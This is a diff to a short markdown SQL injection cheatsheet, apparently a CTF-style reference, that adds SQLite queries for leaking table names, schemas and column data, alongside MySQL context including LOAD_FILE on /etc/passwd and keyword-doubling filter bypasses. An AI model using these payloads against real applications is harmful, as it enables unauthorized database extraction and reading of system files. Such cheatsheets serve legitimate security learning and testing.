@@ -1,4 +1,4 @@
-SQL Injection Syntax Cheatsheet
+MySQL Injection Syntax Cheatsheet
 =============
 
 > John Hammond 
@@ -72,6 +72,7 @@ SELECT LOAD_FILE("/etc/passwd");
 ```
 
 
+
 Etcetera..
 ------
 
@@ -82,4 +83,31 @@ frfromom => from
 oorr => or
 loaload_filed_file => load_file
 selselectect => select
+```
+
+
+---------------------------------
+
+SQLite Injection
+=================
+
+Leak all the table names as a string
+----------
+
+```
+SELECT GROUP_CONCAT(name) FROM sqlite_master
+```
+
+Leak all the column names from a table as a string
+----------
+
+```
+SELECT GROUP_CONCAT(sql) FROM sqlite_master WHERE tbl_name = '<TABLE_NAME>' AND type = 'table'
+```
+
+Leak ONE column from a table
+--------
+
+```
+SELECT GROUP_CONCAT(<COLUMN_NAME>) FROM <TABLE_NAME>
 ```
